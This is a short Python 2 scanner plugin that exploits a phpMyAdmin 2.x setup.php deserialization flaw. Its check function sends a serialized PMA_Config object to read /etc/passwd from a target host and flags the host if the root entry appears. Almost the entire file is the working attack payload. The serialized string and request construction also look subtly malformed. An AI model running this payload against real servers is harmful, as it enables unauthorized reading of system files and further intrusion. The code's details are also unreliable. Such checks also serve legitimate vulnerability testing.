# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "phpmyadmin scripts/setup.php 反序列化漏洞",
        "info": "phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码",
        "level": "高危",
        "type": "命令执行",
        "author": "taro",
        "url": "https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md",
        "keyword": "target:phpmyadmin",
    }
    return plugin_info

def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/scripts/setup.php'
    url = u + payload_url
    d = {'action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}'}
    try:
        res = requests.get(url, data=d, timeout=timeout)
        if 'root:x:0:0' in res.text:
            info = '存在命令执行漏洞: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
